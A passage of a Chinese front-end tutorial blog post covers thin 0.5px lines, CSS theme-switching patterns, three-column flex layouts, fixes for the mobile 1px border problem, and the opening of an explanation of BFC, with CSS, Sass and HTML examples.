class="line">    height: 1px;</span><br><span class="line">    background: linear-gradient(0deg, #fff, #000);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;p&gt;linear-gradient(0deg, #fff, #000)&lt;/p&gt;</span><br><span class="line">&lt;div class=&quot;hr gradient&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="http://files.shanqianche.cn/20228/1659669787124.png" alt="效果"></p><p>inear-gradient(0deg, #fff, #000)的意思是：<font color="#FF00FF">渐变的角度从下往上</font>，<font color="#FF00FF">从白色#fff渐变到黑色#000，而且是线性的，在高清屏上，1px的逻辑像素代表的物理（设备）像素有2px，由于是线性渐变，所以第1个px只能是#fff，而剩下的那个像素只能是#000，这样就达到了画一半的目的。</font></p><h2 id="boxshadow"><a href="#boxshadow" class="headerlink" title="boxshadow"></a>boxshadow</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">.hr.boxshadow &#123;</span><br><span class="line">    height: 1px;</span><br><span class="line">    background: none;</span><br><span class="line">    box-shadow: 0 0.5px 0 #000;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;p&gt;box-shadow: 0 0.5px 0 #000&lt;/p&gt;</span><br><span class="line">&lt;div class=&quot;hr boxshadow&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="viewport"><a href="#viewport" class="headerlink" title="viewport"></a>viewport</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-sacle=0.5&quot;&gt;</span><br></pre></td></tr></table></figure><p>其中width=device-width<strong>表示将viewport视窗的宽度调整为设备的宽度，</strong> 这个宽度通常是指物理上宽度。默认的缩放比例为1时，如iphone 6竖屏的宽度为750px，它的dpr=2，用2px表示1px，这样设置之后viewport的宽度就变成375px。但是我们可以改成0.5，viewport的宽度就是原本的750px，所以1个px还是1px，正常画就行，但这样也意味着UI需要按2倍图的出，整体面面的单位都会放大一倍。</p><h1 id="css-切换主题"><a href="#css-切换主题" class="headerlink" title="css 切换主题"></a>css 切换主题</h1><h2 id="主题层"><a href="#主题层" class="headerlink" title="主题层"></a>主题层</h2><p>这应该是实现主题功能的一种最常用的手段了。首先，我们的站点会有一个最初的基础样式（或者叫默认样式）；然后通过添加一些后续的额外的CSS来覆盖与重新定义部分样式。</p><p><strong>具体实现</strong><br>首先，我们引入基础的样式components.*文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;components.tabs&quot;;</span><br><span class="line">@import &quot;components.buttons&quot;</span><br></pre></td></tr></table></figure><p>其中components.tabs文件内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.tab &#123;</span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line">    background-color: gray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，假设我们的*<em>某个主题的样式文件存放于theme.<em>文件：</em></em><br>对应于components.tabs，theme.tabs文件内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.tab &#123;</span><br><span class="line">    background-color: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，我们只需要引入主题样式文件即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;components.tabs&quot;;</span><br><span class="line">@import &quot;components.buttons&quot;</span><br><span class="line"></span><br><span class="line">@import &quot;theme.tabs&quot;;</span><br></pre></td></tr></table></figure><p>这样当前的样式就变为了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.tab &#123;</span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line">    /* background-color: gray; */</span><br><span class="line">    background-color: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优点</strong><br>实现方式简单<br>可以实现将主题应用与所有元素<br><strong>缺点</strong><br>过多的冗余代码<br>许多的CSS其实是无用的，浪费了带宽<br>把样式文件切分到许多文件中，更加琐碎</p><h2 id="有状态的主题"><a href="#有状态的主题" class="headerlink" title="有状态的主题"></a>有状态的主题</h2><blockquote><p>该方式可以实现基于条件选择不同的主题皮肤，并允许用户在客户端随时切换主题。非常适合需要客户端样式切换功能，或者需要对站点某一部分（区域）进行独立样式设置的场景。</p></blockquote><p><strong>具体实现</strong><br>还是类似上一节中 Tab 的这个例子，我们可以将 Tab 部分的 (S)CSS 改为如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.tab &#123;</span><br><span class="line">    background-color: gray;</span><br><span class="line"></span><br><span class="line">    .t-red &amp; &#123;</span><br><span class="line">        background-color: red;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .t-blue &amp; &#123;</span><br><span class="line">        background-color: blue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们<font color="#FF00FF">把.t-red与.t-blue称为 Tab 元素的上下文环境（context）。Tab 元素会根据 context 的不同展示出不同的样式。</font><br>最后我们给body元素加上这个开关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body class=&quot;t-red&quot;&gt;</span><br><span class="line">    &lt;ul class=&quot;tabs&quot;&gt;...&lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>此时 Tab 的颜色为红色。</p><p>当我们将t-red改为t-blue时，Tab 就变为了蓝色主题。</p><p>进一步的，<font color="#FF00FF">我们可以创建一些 (S)CSS 的 util class（工具类）来专门控制一些 CSS 属性</font>，帮助我们更好地控制主题。例如我们使用如下的.u-color-current类来控制不同主题下的字体颜色</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.u-color-current &#123;</span><br><span class="line">    .t-red &amp; &#123;</span><br><span class="line">        color: red;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .t-blue &amp; &#123;</span><br><span class="line">        color: blue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，当我们在不同主题上下文环境下使用.u-color-current时，就<font color="#FF00FF">可以控制元素展示出不同主题的字体</font>颜色</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body class=&quot;t-red&quot;&gt;</span><br><span class="line">    &lt;h1 class=&quot;page-title u-color-current&quot;&gt;...&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p><strong>优点</strong><br>将许多主题放在了同一处代码中<br>非常适合主题切换的功能<br>非常适合站点局部的主题化<br>可以实现将主题应用于所有元素<br><strong>缺点</strong><br>有时有点也是缺点，将许多主题混杂在了同一块代码中<br>可能会存在冗余</p><h2 id="配置主题"><a href="#配置主题" class="headerlink" title="配置主题"></a>配置主题</h2><p>这种方式其实是在开发侧来实现主题样式的区分与切换的。基于不同的配置，配合一些开发的自动化工具，我们可以在开发时期根据配置文件，编译生成不同主题的 CSS 文件。</p><p>它一般会结合使用一些 CSS 预处理器，可以对不同的 UI 元素进行主题分离，并且向客户端直接提供主题样式下最终的 CSS。</p><p><strong>具体实现</strong><br>我们还是以 Sass 为例：<br>首先会有一份 Sass 的配置文件，例如settings.config.scss，在这份配置中定义当前的主题值以及一些其他变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$theme: red;</span><br></pre></td></tr></table></figure><p>然后对于一个 Tab 组件，我们这么来写它的 Sass 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.tab &#123;</span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line"></span><br><span class="line">    @if ($theme == red) &#123;</span><br><span class="line">        background-color: red;</span><br><span class="line">    &#125; @else &#123;</span><br><span class="line">        background-color: gray;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时，我们在其之前引入相应的配置文件后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;settings.config&quot;;</span><br><span class="line">@import &quot;components.tabs&quot;;</span><br></pre></td></tr></table></figure><p>Tab 组件就会呈现出红色主题。</p><p>当然，我们也可以把我们的settings.config.scss做的更健壮与易扩展一些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$config: (</span><br><span class="line">    theme: red,</span><br><span class="line">    env: dev,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">// 从$config中获取相应的配置变量</span><br><span class="line">@function config($key) &#123;</span><br><span class="line">    @return map-get($config, $key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与之前相比，这时候使用起来只需要进行一些小的修改，将直接使用theme变量改为调用config方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.tab &#123;</span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line"></span><br><span class="line">    @if (config(theme) == red) &#123;</span><br><span class="line">        background-color: red;</span><br><span class="line">    &#125; @else &#123;</span><br><span class="line">        background-color: gray;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优点</strong><br>访问网站时，只会传输所需的 CSS，节省带宽<br>将主题的控制位置放在了一个地方（例如上例中的settings.config.scss文件）<br>可以实现将主题应用于所有元素<br><strong>缺点</strong><br>在 Sass 中会有非常多逻辑代码<br>只支持有限数量的主题<br>主题相关的信息会遍布代码库中<br>添加一个新主题会非常费劲</p><h2 id="主题调色板"><a href="#主题调色板" class="headerlink" title="主题调色板"></a>主题调色板</h2><p>这种方式有些类似于我们绘图时，预设了一个调色板（palette），然后使用的颜色都从其中取出一样。<br>在实现主题功能时，我们也会有一个类似的“调色板”，其中定义了主题所需要的各种属性值，之后再将这些信息注入到项目中。<br>当你经常需要为客户端提供完全的定制化主题，并且经常希望更新或添加主题时，这种模式会是一个不错的选择。</p><p><strong>具体实现</strong></p><p>在方式三中，我们在一个独立的配置文件中设置了一些“环境”变量，来标示当前所处的主题。而在方式四中，我们会更进一步，抽取出一个专门的 palette 文件，用于存放不同主题的变量信息。</p><p>例如，现在我们有一个settings.palette.red.scss文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$color: red;</span><br><span class="line">$color-tabs-background: $color-red;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后我们的components.tabs.scss文件内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.tabs &#123;</span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line">    backgroung-color: $color-tabs-background;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候，我们只需要引入这两个文件即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;settings.palette.red&quot;;</span><br><span class="line">@import &quot;components.tabs&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，components.tabs.scss中并没有关于主题的逻辑判断，我们只需要专注于编辑样式，剩下就是选择所需的主题调色板（palette）即可。</p><p><strong>优点</strong><br>编译出来的样式代码无冗余<br>非常适合做一些定制化主题，例如一个公司采购了你们的系统，你可以很方便实现一个该公司的主题<br>可以从一个文件中完全重制出你需要的主题样式<br><strong>缺点</strong><br>由于主要通过设定不同变量，所以代码确定后，能实现的修改范围会是有限的</p><h2 id="用户定制化"><a href="#用户定制化" class="headerlink" title="用户定制化"></a>用户定制化</h2><p>这种模式一般会提供一个个性化配置与管理界面，让用户能自己定义页面的展示样式。<br>“用户定制化”在社交媒体产品、SaaS 平台或者是 Brandable Software 中最为常见。<br><strong>具体实现</strong><br>要实现定制化，可以结合方式二中提到的 util class。<br>首先，页面中支持自定义的元素会被预先添加 util class，例如 Tab 元素中的u-user-color-background</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul class=&quot;tabs u-user-color-background&quot;&gt;...&lt;/ul&gt;</span><br></pre></td></tr></table></figure><p>此时，u-user-color-background还并未定义任何样式。而当用户输入了一个背景色时，我们会创建一个标签，并将 hex 值注入其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;style id=&quot;my-custom&quot;&gt;</span><br><span class="line">    .u-user-color-background &#123;</span><br><span class="line">        background-color: #00ffff;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>这时用户就得到了一个红色的 Tab。</p><p><strong>优点</strong><br>不需要开发人员的输入信息（是用户定义的）<br>允许用户拥有自己“独一无二”的站点<br>非常实用<br><strong>缺点</strong><br>不需要开发人员的输入信息也意味着你需要处理更多的“不可控”情况<br>会有许多的冗余<br>会浪费 CSS 的带宽<br>失去部分 CSS 的浏览器缓存能力</p><h1 id="布局-三栏布局-平均分布"><a href="#布局-三栏布局-平均分布" class="headerlink" title="布局: 三栏布局(平均分布)"></a>布局: 三栏布局(平均分布)</h1><ol><li>flex: 设置父级弹性盒，子盒子三个各占1份</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;Grid&quot;&gt;</span><br><span class="line">   &lt;div class=&quot;Grid-cell&quot;&gt;1/3&lt;/div&gt;</span><br><span class="line">   &lt;div class=&quot;Grid-cell&quot;&gt;1/3&lt;/div&gt;</span><br><span class="line">   &lt;div class=&quot;Grid-cell&quot;&gt;1/3&lt;/div&gt;</span><br><span class="line"> &lt;/div&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.Grid &#123;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.Grid-cell &#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">  background: #eee;</span><br><span class="line">  margin: 10px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>flex 百分比</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;Grid&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;Grid-cell col3&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;Grid-cell col3&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;Grid-cell clo3&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>流式布局</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;Grid&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;Grid-cell col3&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;Grid-cell col3&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;Grid-cell clo3&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">.col3 &#123;</span><br><span class="line">  width: 33.33%</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="移动端-1px-问题"><a href="#移动端-1px-问题" class="headerlink" title="移动端 1px 问题"></a>移动端 1px 问题</h1><p><strong>问题：</strong> 1px 的边框，在高清屏下，移动端的1px 会很粗</p><p><strong>产生原因</strong><br>那么为什么会产生这个问题呢？主要是跟一个东西有关，DPR(devicePixelRatio) 设备像素比，它是默认缩放为100%的情况下，设备像素和CSS像素的比值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.devicePixelRatio=物理像素 /CSS像素</span><br></pre></td></tr></table></figure><p>目前主流的屏幕DPR=2 （iPhone 8）,或者3 （iPhone 8 Plus）。拿2倍屏来说，设备的物理像素要实现1像素，而DPR=2，所以css 像素只能是 0.5。一般设计稿是按照750来设计的，它上面的1px是以750来参照的，而我们写css样式是以设备375为参照的，所以我们应该写的0.5px就好了啊！ 试过了就知道，iOS 8+系统支持，安卓系统不支持。<br><strong>解决方案</strong></p><ol><li>WWDC对iOS统给出的方案</li></ol><p>在 WWDC大会上，给出来了1px方案，<strong>当写 0.5px的时候，就会显示一个物理像素宽度的 border，</strong> 而不是一个css像素的 border。 所以在iOS下，你可以这样写。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">border:0.5px solid #E5E5E5</span><br></pre></td></tr></table></figure><p>可能你会问为什么在3倍屏下，不是0.3333px 这样的？经过测试，在Chrome上模拟iPhone 8Plus，发现小于0.46px的时候是显示不出来。<br><strong>总结：</strong><br>优点：简单，没有副作用<br>缺点：支持iOS 8+，不支持安卓。后期安卓follow就好了。</p><ol start="2"><li>使用边框图片</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">border: 1px solid transparent;</span><br><span class="line">border-image: url(&#x27;./../../image/96.jpg&#x27;) 2 repeat;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong><br>优点：没有副作用<br>缺点：border颜色变了就得重新制作图片；圆角会比较模糊。</p><ol start="3"><li>使用box-shadow实现</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">box-shadow: 0  -1px 1px -1px #e5e5e5,   //上边线</span><br><span class="line">            1px  0  1px -1px #e5e5e5,   //右边线</span><br><span class="line">            0  1px  1px -1px #e5e5e5,   //下边线</span><br><span class="line">            -1px 0  1px -1px #e5e5e5;   //左边线</span><br></pre></td></tr></table></figure><p><strong>总结</strong><br>优点：使用简单，圆角也可以实现<br>缺点：模拟的实现方法，仔细看谁看不出来这是阴影不是边框。</p><ol start="4"><li><p>使用伪元素</p><ul><li><p>1条border</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.setOnePx&#123;</span><br><span class="line">  position: relative;</span><br><span class="line">  &amp;::after&#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    content: &#x27;&#x27;;</span><br><span class="line">    background-color: #e5e5e5;</span><br><span class="line">    display: block;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 1px; /*no*/</span><br><span class="line">    transform: scale(1, 0.5);</span><br><span class="line">    top: 0;</span><br><span class="line">    left: 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，将伪元素设置绝对定位，并且和父元素的左上角对齐，将width 设置100%，height设置为1px，然后进行在Y方向缩小0.5倍。</p><ul><li>4条border<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.setBorderAll&#123;</span><br><span class="line">     position: relative;</span><br><span class="line">       &amp;:after&#123;</span><br><span class="line">           content:&quot; &quot;;</span><br><span class="line">           position:absolute;</span><br><span class="line">           top: 0;</span><br><span class="line">           left: 0;</span><br><span class="line">           width: 200%;</span><br><span class="line">           height: 200%;</span><br><span class="line">           transform: scale(0.5);</span><br><span class="line">           transform-origin: left top;</span><br><span class="line">           box-sizing: border-box;</span><br><span class="line">           border: 1px solid #E5E5E5;</span><br><span class="line">           border-radius: 4px;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>同样为伪元素设置绝对定位，并且和父元素左上角对其。将伪元素的长和宽先放大2倍，然后再设置一个边框，以左上角为中心，缩放到原来的0.5倍</li></ul></li></ul></li></ol><p><strong>总结：</strong><br><font color="#FF00FF">优点：全机型兼容，实现了真正的1px，而且可以圆角。</font><br>缺点：暂用了after 伪元素，可能影响清除浮动。</p><ol start="5"><li>设置viewport的scale值</li></ol><p>这个解决方案是利用<strong>viewport+rem+js</strong> 实现的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">      &lt;title&gt;1px question&lt;/title&gt;</span><br><span class="line">      &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;</span><br><span class="line">      &lt;meta name=&quot;viewport&quot; id=&quot;WebViewport&quot; content=&quot;initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no&quot;&gt;        </span><br><span class="line">      &lt;style&gt;</span><br><span class="line">          html &#123;</span><br><span class="line">              font-size: 1px;</span><br><span class="line">          &#125;            </span><br><span class="line">          * &#123;</span><br><span class="line">              padding: 0;</span><br><span class="line">              margin: 0;</span><br><span class="line">          &#125;</span><br><span class="line">          .top_b &#123;</span><br><span class="line">              border-bottom: 1px solid #E5E5E5;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          .a,.b &#123;</span><br><span class="line">                      box-sizing: border-box;</span><br><span class="line">              margin-top: 1rem;</span><br><span class="line">              padding: 1rem;                </span><br><span class="line">              font-size: 1.4rem;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          .a &#123;</span><br><span class="line">              width: 100%;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          .b &#123;</span><br><span class="line">              background: #f5f5f5;</span><br><span class="line">              width: 100%;</span><br><span class="line">          &#125;</span><br><span class="line">      &lt;/style&gt;</span><br><span class="line">      &lt;script&gt;</span><br><span class="line">          var viewport = document.querySelector(&quot;meta[name=viewport]&quot;);</span><br><span class="line">          //下面是根据设备像素设置viewport</span><br><span class="line">          if (window.devicePixelRatio == 1) &#123;</span><br><span class="line">              viewport.setAttribute(&#x27;content&#x27;, &#x27;width=device-width,initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no&#x27;);</span><br><span class="line">          &#125;</span><br><span class="line">          if (window.devicePixelRatio == 2) &#123;</span><br><span class="line">              viewport.setAttribute(&#x27;content&#x27;, &#x27;width=device-width,initial-scale=0.5, maximum-scale=0.5, minimum-scale=0.5, user-scalable=no&#x27;);</span><br><span class="line">          &#125;</span><br><span class="line">          if (window.devicePixelRatio == 3) &#123;</span><br><span class="line">              viewport.setAttribute(&#x27;content&#x27;, &#x27;width=device-width,initial-scale=0.3333333333333333, maximum-scale=0.3333333333333333, minimum-scale=0.3333333333333333, user-scalable=no&#x27;);</span><br><span class="line">          &#125;</span><br><span class="line">          var docEl = document.documentElement;</span><br><span class="line">          var fontsize = 32* (docEl.clientWidth / 750) + &#x27;px&#x27;;</span><br><span class="line">          docEl.style.fontSize = fontsize;</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">      &lt;div class=&quot;top_b a&quot;&gt;下面的底边宽度是虚拟1像素的&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;b&quot;&gt;上面的边框宽度是虚拟1像素的&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>总结</strong><br>优点：全机型兼容，直接写1px不能再方便<br>缺点：适用于新的项目，老项目可能改动大</p><h1 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在解释BFC之前，先说一下文档流。我们常说的文档流其实分为<font color="#FF8C00">定位流、浮动流、普通流</font>三种。而普通流其实就是指BFC中的FC。FC(Formatting Context)，直译过来是格式化上下文，它是页面中的一块渲染区域，有一套渲染规则，决定了其子元素如何布局，以及和其他元素之间的关系和作用。常见的FC有BFC、IFC，还有GFC和FFC。</p><p>BFC(Block Formatting Context)块级格式化上下文，是用于布局块级盒子的一块渲染区域。MDN上的解释<font color="#FF8C00">：BFC是Web页面 CSS 视觉渲染的一部分，<strong>用于决定块盒子的布局</strong>及浮动相互影响范围的一个区域</font>。</p><p><strong>注意：</strong> <font color="#FF00FF">一个BFC的范围包含创建该上下文元素的所有子元素，但不包括创建了新BFC的子元素的内部元素</font>。这从另一方角度说明，一个元素不能同时存在于两个BFC中。<font 